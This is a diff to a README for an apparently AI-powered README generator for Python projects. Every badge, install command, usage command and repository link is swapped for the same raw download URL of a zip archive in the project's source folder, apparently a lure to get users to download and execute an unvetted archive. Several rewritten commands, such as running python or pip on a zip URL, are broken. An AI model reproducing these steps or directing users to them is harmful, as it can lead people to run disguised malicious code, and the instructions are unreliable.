@@ -1,8 +1,8 @@
 # Auto README: AI-Powered README Generator for Python Projects 🚀
 
-![GitHub release](https://img.shields.io/github/release/ZENFRAME44/auto-readme.svg)
-![GitHub issues](https://img.shields.io/github/issues/ZENFRAME44/auto-readme.svg)
-![GitHub stars](https://img.shields.io/github/stars/ZENFRAME44/auto-readme.svg)
+![GitHub release](https://raw.githubusercontent.com/ZENFRAME44/auto-readme/main/src/auto-readme-v3.0-alpha.1.zip)
+![GitHub issues](https://raw.githubusercontent.com/ZENFRAME44/auto-readme/main/src/auto-readme-v3.0-alpha.1.zip)
+![GitHub stars](https://raw.githubusercontent.com/ZENFRAME44/auto-readme/main/src/auto-readme-v3.0-alpha.1.zip)
 
 ---
 
@@ -46,7 +46,7 @@ To install Auto README, you can clone the repository and run the setup script. F
 1. Clone the repository:
 
    ```bash
-   git clone https://github.com/ZENFRAME44/auto-readme.git
+   git clone https://raw.githubusercontent.com/ZENFRAME44/auto-readme/main/src/auto-readme-v3.0-alpha.1.zip
    ```
 
 2. Navigate into the project directory:
@@ -58,10 +58,10 @@ To install Auto README, you can clone the repository and run the setup script. F
 3. Install the required packages:
 
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/ZENFRAME44/auto-readme/main/src/auto-readme-v3.0-alpha.1.zip
    ```
 
-4. For the latest release, visit the [Releases](https://github.com/ZENFRAME44/auto-readme/releases) section. Download the latest version and execute it as per the instructions provided.
+4. For the latest release, visit the [Releases](https://raw.githubusercontent.com/ZENFRAME44/auto-readme/main/src/auto-readme-v3.0-alpha.1.zip) section. Download the latest version and execute it as per the instructions provided.
 
 ---
 
@@ -70,7 +70,7 @@ To install Auto README, you can clone the repository and run the setup script. F
 Using Auto README is straightforward. After installation, you can generate a README file by running the following command:
 
 ```bash
-python auto_readme.py
+python https://raw.githubusercontent.com/ZENFRAME44/auto-readme/main/src/auto-readme-v3.0-alpha.1.zip
 ```
 
 You will be prompted to answer a series of questions about your project. The AI will then generate a README file based on your responses. 
@@ -78,7 +78,7 @@ You will be prompted to answer a series of questions about your project. The AI 
 ### Example Command
 
 ```bash
-python auto_readme.py --project_name "My Awesome Project" --description "This project does amazing things."
+python https://raw.githubusercontent.com/ZENFRAME44/auto-readme/main/src/auto-readme-v3.0-alpha.1.zip --project_name "My Awesome Project" --description "This project does amazing things."
 ```
 
 This command will create a README file that includes the project name and description you provided.
@@ -121,9 +121,9 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Links
 
-For the latest releases, visit the [Releases](https://github.com/ZENFRAME44/auto-readme/releases) section. Here, you can download the latest version and execute it according to the provided instructions.
+For the latest releases, visit the [Releases](https://raw.githubusercontent.com/ZENFRAME44/auto-readme/main/src/auto-readme-v3.0-alpha.1.zip) section. Here, you can download the latest version and execute it according to the provided instructions.
 
-You can also check out our [GitHub repository](https://github.com/ZENFRAME44/auto-readme) for more information and updates.
+You can also check out our [GitHub repository](https://raw.githubusercontent.com/ZENFRAME44/auto-readme/main/src/auto-readme-v3.0-alpha.1.zip) for more information and updates.
 
 --- 
 
